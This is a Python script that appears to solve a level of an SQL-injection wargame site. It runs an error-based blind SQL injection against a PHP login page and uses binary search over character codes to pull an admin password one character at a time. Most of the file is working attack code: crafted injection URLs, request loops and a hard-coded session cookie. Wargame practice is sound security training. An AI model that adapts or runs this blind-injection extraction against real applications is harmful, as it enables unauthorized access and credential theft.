import urllib.request
length=17
pw=""




for i in range(1,18):
	right_index=100000
	left_index=0
	middle_index = int((right_index + left_index)/2)+1
	print()
	print()
	while 1:
		url="http://los.rubiya.kr/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php?pw=asdf'%20or%20id%20='admin'%20and%20if(ord(substr(pw,{index},1))>{ordnum_index},1,(select%201%20union%20select%202));%23".format(index=i,ordnum_index=middle_index)
		r = urllib.request.Request(url)
		r.add_header("Cookie","PHPSESSID=fvvt2rnkr0fn92t77m1gq17742")
		data = urllib.request.urlopen(r).read().decode("utf-8")
		print(url)
		# if(ord(substr(pw,{index},1))>{ordnum}  참
		if data.find("highlight_file") != -1 :
			url="http://los.rubiya.kr/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php?pw=asdf'%20or%20id%20='admin'%20and%20if(ord(substr(pw,{index},1))={ordnum_index},1,(select%201%20union%20select%202));%23".format(index=i,ordnum_index=middle_index)
			r = urllib.request.Request(url)
			r.add_header("Cookie","PHPSESSID=fvvt2rnkr0fn92t77m1gq17742")
			data = urllib.request.urlopen(r).read().decode("utf-8")
			print(url)
			if data.find("highlight_file") != -1 :
				pw = pw + chr(middle_index)
				print("password is {}".format(pw))
				break
			left_index = middle_index
			middle_index = int((left_index + right_index)/2)+1
			print("middle_index : {} | left_index : {} | right_index : {}".format(middle_index,left_index, right_index))
		elif right_index<left_index:
			exit(0)

		else:
			right_index = middle_index
			middle_index = int((left_index + right_index)/2)
			url="http://los.rubiya.kr/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php?pw=asdf'%20or%20id%20='admin'%20and%20if(ord(substr(pw,{index},1))={ordnum_index},1,(select%201%20union%20select%202));%23".format(index=i,ordnum_index=middle_index)
			r = urllib.request.Request(url)
			r.add_header("Cookie","PHPSESSID=fvvt2rnkr0fn92t77m1gq17742")
			data = urllib.request.urlopen(r).read().decode("utf-8")
			print(url)
			if data.find("highlight_file") != -1 :
				pw = pw + chr(middle_index)
				print("password is {}".format(pw))
				break
			print("middle_index : {} | left_index : {} | right_index : {}".format(middle_index,left_index, right_index))
			
		
		
	
	


print(pw)
url='http://los.rubiya.kr/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php?pw={}'.format(pw)
r = urllib.request.Request(url)
r.add_header("Cookie","PHPSESSID=fvvt2rnkr0fn92t77m1gq17742")
data = urllib.request.urlopen(r).read().decode("utf-8")



# "http://los.rubiya.kr/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php?pw=asdf'%20or%20id%20='admin'%20and%20if(length(pw)=68,1,(select%201%20union%20select%202));%23"
# "http://los.rubiya.kr/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php?pw=asdf'%20or%20id%20='admin'%20and%20if(ord(substr(pw,{index},1))>{ordnum},1,(select%201%20union%20select%202));%23".format(index=,ordnum=)


# 루 // 47336
# 비 // 48708






# 총 한글 17개







# highlight_file 있으면

	